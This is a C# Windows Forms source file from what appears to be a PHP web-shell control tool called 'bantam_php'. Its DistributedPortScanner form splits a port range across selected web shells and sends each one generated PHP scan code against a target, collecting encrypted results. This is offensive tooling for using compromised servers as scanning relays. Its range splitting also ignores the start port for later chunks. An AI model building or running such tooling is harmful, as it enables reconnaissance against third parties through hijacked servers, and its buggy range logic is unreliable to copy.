using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bantam_php
{
    public partial class DistributedPortScanner : Form
    {
        public DistributedPortScanner()
        {
            InitializeComponent();
        }

        private void DistributedScanner_Load(object sender, EventArgs e)
        {
            foreach(var shell in BantamMain.Shells) {
                checkedListBoxShells.Items.Add(shell.Key);
            }
        }

        private async void btnScan_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                return;
                //todo ui thing
            }

            int startPort = Convert.ToInt32(textBoxStartPort.Text);
            int endPort = Convert.ToInt32(textBoxEndPort.Text);

            if (startPort > endPort 
             || endPort == 0 || startPort == 0) {
                //todo ui thing
                return;
            }

            btnScan.Enabled = false;

            int shellsCount = checkedListBoxShells.CheckedItems.Count;
            int portsPerShell = ((endPort - startPort) / shellsCount);

            int iter = 1;
            foreach(var checkedItem in checkedListBoxShells.CheckedItems) {
                string portsCode = string.Empty;
                string scannedRange = string.Empty;
                if (iter == shellsCount) {
                    if (iter == 1) {
                        scannedRange = startPort.ToString() + ", " + (endPort).ToString();
                        portsCode = "$ports = range("+ scannedRange + ");";
                    } else {
                        scannedRange = (((iter - 1) * portsPerShell) + 1).ToString() + ", " + (endPort).ToString();
                        portsCode = "$ports = range(" + scannedRange + ");";
                    }
                } else {
                    if (iter == 1) {
                        scannedRange = startPort.ToString() + ", " + (iter * portsPerShell).ToString();
                        portsCode = "$ports = range(" + scannedRange + ");";
                    } else {
                        scannedRange = (((iter - 1) * portsPerShell) + 1).ToString() + ", " + (iter * portsPerShell).ToString();
                        portsCode = "$ports = range("+ scannedRange + ");";
                    }
                    iter++;
                }

                bool encryptResponse = true;
                string shellUrl = checkedListBoxShells.GetItemText(checkedItem);
                string windowTitle = "Ports Scanned ( " + textBoxTarget.Text + ":" + scannedRange + ") - " + shellUrl;
                string phpCode = PhpHelper.PortScanner(textBoxTarget.Text, portsCode, encryptResponse);

                BantamMain.executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL);

                btnScan.Enabled = true;
            }
        }

        private void textBoxStartPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void textBoxEndPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void textBoxTarget_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                btnScan.Enabled = false;
            } else {
                btnScan.Enabled = true;
            }
        }
    }
}
